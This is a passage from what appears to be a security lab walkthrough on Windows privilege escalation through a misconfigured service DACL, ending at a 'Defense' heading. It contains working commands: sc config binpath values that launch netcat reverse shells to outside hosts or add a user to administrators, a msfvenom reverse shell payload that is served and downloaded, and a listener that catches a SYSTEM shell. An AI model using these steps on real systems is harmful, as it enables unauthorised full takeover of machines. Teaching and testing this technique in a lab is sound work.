<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">subinacl</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">service</span> <span class="s2">&#34;DACL VulnService&#34;</span> <span class="p">/</span><span class="n">grant</span><span class="p">=</span><span class="nb">DESKTOP-XXX</span><span class="p">\</span><span class="n">user</span><span class="p">=</span><span class="n">PTO</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>The following is a complete list of service permissions:</p>
<table>
  <thead>
      <tr>
          <th>A</th>
          <th>B</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td>F: Full Control</td>
          <td>E: Enumerate Dependent Services</td>
      </tr>
      <tr>
          <td>R: Generic Read</td>
          <td>C: Service Change Configuration</td>
      </tr>
      <tr>
          <td>W: Generic Write</td>
          <td>T: Start Service</td>
      </tr>
      <tr>
          <td>X: Generic Execute</td>
          <td>O: Stop Service</td>
      </tr>
      <tr>
          <td>L: Read Control</td>
          <td>P: Pause/Continue Service</td>
      </tr>
      <tr>
          <td>Q: Query Service Configuration</td>
          <td>I: Interrogate Service</td>
      </tr>
      <tr>
          <td>S: Query Service Status</td>
          <td>U: Service User-Defined Control Commands</td>
      </tr>
  </tbody>
</table>
<p>Start the service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">system32</span><span class="p">&gt;</span><span class="nb">sc start </span><span class="s2">&#34;DACL VulnService&#34;</span>                                                                                                                                                         <span class="n">SERVICE_NAME</span><span class="err">:</span> <span class="n">DACL</span> <span class="n">VulnService</span>                                                                              <span class="nb">TYPE </span>              <span class="err">:</span> <span class="mf">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
</span></span><span class="line"><span class="cl">        <span class="n">STATE</span>              <span class="err">:</span> <span class="mf">2</span>  <span class="n">START_PENDING</span>
</span></span><span class="line"><span class="cl">                                <span class="p">(</span><span class="n">NOT_STOPPABLE</span><span class="p">,</span> <span class="n">NOT_PAUSABLE</span><span class="p">,</span> <span class="n">IGNORES_SHUTDOWN</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">WIN32_EXIT_CODE</span>    <span class="err">:</span> <span class="mf">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_EXIT_CODE</span>  <span class="err">:</span> <span class="mf">0</span>  <span class="p">(</span><span class="n">0x0</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">CHECKPOINT</span>         <span class="err">:</span> <span class="n">0x0</span>
</span></span><span class="line"><span class="cl">        <span class="n">WAIT_HINT</span>          <span class="err">:</span> <span class="n">0x7d0</span>
</span></span><span class="line"><span class="cl">        <span class="n">PID</span>                <span class="err">:</span> <span class="mf">12876</span>
</span></span><span class="line"><span class="cl">        <span class="n">FLAGS</span>              <span class="err">:</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="privilege-escalation-1">Privilege Escalation</h2>
<p>Let&rsquo;s verify if we can restart the service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SysInternalsSuite</span><span class="p">\</span><span class="n">accesschk</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">accepteula</span> <span class="n">-uvqc</span> <span class="s2">&#34;DACL VulnService&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Accesschk</span> <span class="n">v6</span><span class="p">.</span><span class="py">14</span> <span class="p">-</span> <span class="n">Reports</span> <span class="n">effective</span> <span class="n">permissions</span> <span class="k">for</span> <span class="n">securable</span> <span class="n">objects</span>
</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="err">⌐</span> <span class="mf">2006</span><span class="p">-</span><span class="mf">2021</span> <span class="n">Mark</span> <span class="n">Russinovich</span>
</span></span><span class="line"><span class="cl"><span class="n">Sysinternals</span> <span class="p">-</span> <span class="n">www</span><span class="p">.</span><span class="py">sysinternals</span><span class="p">.</span><span class="py">com</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">DACL</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">  <span class="n">Medium</span> <span class="na">Mandatory</span> <span class="n">Level</span> <span class="p">(</span><span class="k">Default</span><span class="p">)</span> <span class="p">[</span><span class="nb">No-Write</span><span class="n">-Up</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">  <span class="n">RW</span> <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_ALL_ACCESS</span>
</span></span><span class="line"><span class="cl">  <span class="n">RW</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_ALL_ACCESS</span>
</span></span><span class="line"><span class="cl">  <span class="n">RW</span> <span class="n">Everyone</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_QUERY_STATUS</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_QUERY_CONFIG</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_CHANGE_CONFIG</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_INTERROGATE</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_ENUMERATE_DEPENDENTS</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_START</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_STOP</span>
</span></span><span class="line"><span class="cl">        <span class="n">READ_CONTROL</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Noticed how the <code>BUILTIN\Administrators</code> groups have all the service permissions with <code>SERVICE_ALL_ACCESS</code>. This means that we have full control over the service since the default Windows low-privileged (medium-integrity level) user is in this group by default:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="n">whoami</span>
</span></span><span class="line"><span class="cl"><span class="nb">desktop-bn</span><span class="p">\</span><span class="n">user</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="n">whoami</span> <span class="p">/</span><span class="n">groups</span> <span class="p">|</span> <span class="n">findstr</span> <span class="p">/</span><span class="n">i</span> <span class="s2">&#34;builtin\administrators&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>                                        <span class="nb">Alias</span>            <span class="n">S</span><span class="p">-</span><span class="mf">1</span><span class="p">-</span><span class="mf">5</span><span class="p">-</span><span class="mf">32</span><span class="p">-</span><span class="mf">544</span> <span class="nb">Group </span><span class="n">used</span> <span class="k">for</span> <span class="n">deny</span> <span class="n">only</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We can enumerate the service access rights from medium-integrity level command prompt or PowerShell console with accesschk:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span> <span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">SysInternalsSuite</span><span class="p">\</span><span class="n">accesschk</span><span class="p">.</span><span class="py">exe</span> <span class="p">/</span><span class="n">accepteula</span> <span class="n">-uwcqv</span> <span class="n">user</span> <span class="s2">&#34;DACL VulnService&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">Accesschk</span> <span class="n">v6</span><span class="p">.</span><span class="py">14</span> <span class="p">-</span> <span class="n">Reports</span> <span class="n">effective</span> <span class="n">permissions</span> <span class="k">for</span> <span class="n">securable</span> <span class="n">objects</span>
</span></span><span class="line"><span class="cl"><span class="n">Copyright</span> <span class="err">⌐</span> <span class="mf">2006</span><span class="p">-</span><span class="mf">2021</span> <span class="n">Mark</span> <span class="n">Russinovich</span>
</span></span><span class="line"><span class="cl"><span class="n">Sysinternals</span> <span class="p">-</span> <span class="n">www</span><span class="p">.</span><span class="py">sysinternals</span><span class="p">.</span><span class="py">com</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">RW</span> <span class="n">DACL</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_ALL_ACCESS</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>As we can see from the output above, we have the <strong>SERVICE_ALL_ACCESS</strong> access right therefore we can modify the <strong>BINARY_PATH_NAME</strong> value that is used by the service and to do that we can use service control manager to modify the service, this are a few things that we could try:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">sc </span><span class="n">config</span> <span class="p">&lt;</span><span class="n">Service_Name</span><span class="p">&gt;</span> <span class="n">binpath</span><span class="p">=</span> <span class="s2">&#34;C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">sc </span><span class="n">config</span> <span class="p">&lt;</span><span class="n">Service_Name</span><span class="p">&gt;</span> <span class="n">binpath</span><span class="p">=</span> <span class="s2">&#34;net localgroup administrators username /add&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">sc </span><span class="n">config</span> <span class="p">&lt;</span><span class="n">Service_Name</span><span class="p">&gt;</span> <span class="n">binpath</span><span class="p">=</span> <span class="s2">&#34;cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nb">sc </span><span class="n">config</span> <span class="p">&lt;</span><span class="n">Service_Name</span><span class="p">&gt;</span> <span class="n">binpath</span><span class="p">=</span> <span class="s2">&#34;C:\meter443.exe&#34;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We&rsquo;ll simply do the following:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">config</span> <span class="s2">&#34;DACL VulnService&#34;</span> <span class="n">binpath</span><span class="p">=</span> <span class="s2">&#34;\&#34;</span><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">\</span><span class="n">reverse</span><span class="p">.</span><span class="n">exe</span><span class="p">\</span><span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">ChangeServiceConfig</span> <span class="n">SUCCESS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">qc</span> <span class="s2">&#34;DACL VulnService&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">QueryServiceConfig</span> <span class="n">SUCCESS</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">SERVICE_NAME</span><span class="err">:</span> <span class="n">DACL</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="nb">TYPE </span>              <span class="err">:</span> <span class="mf">10</span>  <span class="n">WIN32_OWN_PROCESS</span>
</span></span><span class="line"><span class="cl">        <span class="n">START_TYPE</span>         <span class="err">:</span> <span class="mf">3</span>   <span class="n">DEMAND_START</span>
</span></span><span class="line"><span class="cl">        <span class="n">ERROR_CONTROL</span>      <span class="err">:</span> <span class="mf">1</span>   <span class="n">NORMAL</span>
</span></span><span class="line"><span class="cl">        <span class="n">BINARY_PATH_NAME</span>   <span class="err">:</span> <span class="s2">&#34;C:\Tools\reverse.exe&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="n">LOAD_ORDER_GROUP</span>   <span class="err">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">TAG</span>                <span class="err">:</span> <span class="mf">0</span>
</span></span><span class="line"><span class="cl">        <span class="n">DISPLAY_NAME</span>       <span class="err">:</span> <span class="n">DACL</span> <span class="n">VulnService</span>
</span></span><span class="line"><span class="cl">        <span class="n">DEPENDENCIES</span>       <span class="err">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">SERVICE_START_NAME</span> <span class="err">:</span> <span class="n">LocalSystem</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p>Note: In the real-world we would use an implant instead.</p>
</blockquote>
<p>Generate a reverse shell payload and set up a <code>http</code> service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ msfvenom -p windows/x64/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.27.128 <span class="nv">LPORT</span><span class="o">=</span><span class="m">443</span> -f exe -o reverse.exe
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No platform was selected, choosing Msf::Module::Platform::Windows from the payload
</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> No arch selected, selecting arch: x64 from the payload
</span></span><span class="line"><span class="cl">No encoder specified, outputting raw payload
</span></span><span class="line"><span class="cl">Payload size: <span class="m">460</span> bytes
</span></span><span class="line"><span class="cl">Final size of exe file: <span class="m">7168</span> bytes
</span></span><span class="line"><span class="cl">Saved as: reverse.exe
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">❯ sudo python3 -m http.server
</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> kali:
</span></span><span class="line"><span class="cl">Serving HTTP on 0.0.0.0 port <span class="m">8000</span> <span class="o">(</span>http://0.0.0.0:8000/<span class="o">)</span> ...
</span></span><span class="line"><span class="cl">192.168.27.129 - - <span class="o">[</span>14/Mar/2022 06:52:21<span class="o">]</span> <span class="s2">&#34;GET /reverse.exe HTTP/1.1&#34;</span> <span class="m">200</span> -
</span></span></code></pre></td></tr></table>
</div>
</div><p>Transfer the payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS </span><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span> <span class="nb">wget </span><span class="mf">192.168</span><span class="p">.</span><span class="py">27</span><span class="p">.</span><span class="mf">128</span><span class="err">:</span><span class="mf">8000</span><span class="p">/</span><span class="n">reverse</span><span class="p">.</span><span class="py">exe</span> <span class="n">-O</span> <span class="n">reverse</span><span class="p">.</span><span class="py">exe</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Then in the attacker host, we&rsquo;ll set up a <code>nc</code> listener:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">nc -lvnp <span class="m">443</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Now we&rsquo;re gonna restart the service:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="n">net</span> <span class="n">stop</span> <span class="s2">&#34;DACL VulnService&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">DACL</span> <span class="n">VulnService</span> <span class="n">service</span> <span class="n">is</span> <span class="n">stopping</span><span class="p">.</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">DACL</span> <span class="n">VulnService</span> <span class="n">service</span> <span class="n">was</span> <span class="n">stopped</span> <span class="n">successfully</span><span class="p">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="n">net</span> <span class="nb">start </span><span class="s2">&#34;DACL VulnService&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c"># THIS WILL HANG</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We have received a reverse shell as <code>NT AUTHORITY\SYSTEM</code> with <code>System Integrity Level</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ nc -lvnp <span class="m">443</span>
</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">443</span> ...
</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>192.168.27.128<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.27.129<span class="o">]</span> <span class="m">50645</span>
</span></span><span class="line"><span class="cl">Microsoft Windows <span class="o">[</span>Version 10.0.22000.493<span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="o">(</span>c<span class="o">)</span> Microsoft Corporation. All rights reserved.
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">C:<span class="se">\W</span>indows<span class="se">\s</span>ystem32&gt;whoami /all
</span></span><span class="line"><span class="cl">whoami /all
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">USER INFORMATION
</span></span><span class="line"><span class="cl">----------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">User Name           <span class="nv">SID</span>
</span></span><span class="line"><span class="cl"><span class="o">===================</span> <span class="o">========</span>
</span></span><span class="line"><span class="cl">nt authority<span class="se">\s</span>ystem S-1-5-18
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">GROUP INFORMATION
</span></span><span class="line"><span class="cl">-----------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Group Name                             Type             SID          <span class="nv">Attributes</span>
</span></span><span class="line"><span class="cl"><span class="o">======================================</span> <span class="o">================</span> <span class="o">============</span> <span class="o">==================================================</span>
</span></span><span class="line"><span class="cl">BUILTIN<span class="se">\A</span>dministrators                 Alias            S-1-5-32-544 Enabled by default, Enabled group, Group owner
</span></span><span class="line"><span class="cl">Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">NT AUTHORITY<span class="se">\A</span>uthenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
</span></span><span class="line"><span class="cl">Mandatory Label<span class="se">\S</span>ystem Mandatory Level Label            S-1-16-16384
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">PRIVILEGES INFORMATION
</span></span><span class="line"><span class="cl">----------------------
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Privilege Name                            Description                                                        <span class="nv">State</span>
</span></span><span class="line"><span class="cl"><span class="o">=========================================</span> <span class="o">==================================================================</span> <span class="o">========</span>
</span></span><span class="line"><span class="cl">SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
</span></span><span class="line"><span class="cl">SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
</span></span><span class="line"><span class="cl">SeIncreaseQuotaPrivilege                  Adjust memory quotas <span class="k">for</span> a process                                 Disabled
</span></span><span class="line"><span class="cl">SeTcbPrivilege                            Act as part of the operating system                                Enabled
</span></span><span class="line"><span class="cl">SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
</span></span><span class="line"><span class="cl">SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
</span></span><span class="line"><span class="cl">SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
</span></span><span class="line"><span class="cl">SeSystemProfilePrivilege                  Profile system performance                                         Enabled
</span></span><span class="line"><span class="cl">SeSystemtimePrivilege                     Change the system <span class="nb">time</span>                                             Disabled
</span></span><span class="line"><span class="cl">SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
</span></span><span class="line"><span class="cl">SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
</span></span><span class="line"><span class="cl">SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
</span></span><span class="line"><span class="cl">SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
</span></span><span class="line"><span class="cl">SeBackupPrivilege                         Back up files and directories                                      Disabled
</span></span><span class="line"><span class="cl">SeRestorePrivilege                        Restore files and directories                                      Disabled
</span></span><span class="line"><span class="cl">SeShutdownPrivilege                       Shut down the system                                               Disabled
</span></span><span class="line"><span class="cl">SeDebugPrivilege                          Debug programs                                                     Enabled
</span></span><span class="line"><span class="cl">SeAuditPrivilege                          Generate security audits                                           Enabled
</span></span><span class="line"><span class="cl">SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
</span></span><span class="line"><span class="cl">SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
</span></span><span class="line"><span class="cl">SeUndockPrivilege                         Remove computer from docking station                               Disabled
</span></span><span class="line"><span class="cl">SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
</span></span><span class="line"><span class="cl">SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
</span></span><span class="line"><span class="cl">SeCreateGlobalPrivilege                   Create global objects                                              Enabled
</span></span><span class="line"><span class="cl">SeIncreaseWorkingSetPrivilege             Increase a process working <span class="nb">set</span>                                     Enabled
</span></span><span class="line"><span class="cl">SeTimeZonePrivilege                       Change the <span class="nb">time</span> zone                                               Enabled
</span></span><span class="line"><span class="cl">SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
</span></span><span class="line"><span class="cl">SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token <span class="k">for</span> another user in the same session Enabled
</span></span></code></pre></td></tr></table>
</div>
</div><p>When we disconnect or exit our reverse shell, we&rsquo;ll receive this output in the Windows system:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">user</span><span class="p">&gt;</span><span class="n">net</span> <span class="nb">start </span><span class="s2">&#34;DACL VulnService&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">The</span> <span class="n">service</span> <span class="n">is</span> <span class="n">not</span> <span class="n">responding</span> <span class="n">to</span> <span class="n">the</span> <span class="n">control</span> <span class="n">function</span><span class="p">.</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">More</span> <span class="n">help</span> <span class="n">is</span> <span class="n">available</span> <span class="n">by</span> <span class="n">typing</span> <span class="n">NET</span> <span class="n">HELPMSG</span> <span class="mf">2186</span><span class="p">.</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>We&rsquo;re gonna delete this service from an <strong>administrator</strong> command prompt:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Tools</span><span class="p">&gt;</span><span class="nb">sc </span><span class="n">delete</span> <span class="s2">&#34;DACL VulnService&#34;</span>
</span></span><span class="line"><span class="cl"><span class="p">[</span><span class="no">SC</span><span class="p">]</span> <span class="n">DeleteService</span> <span class="n">SUCCESS</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="defense-1">Defense</h2>
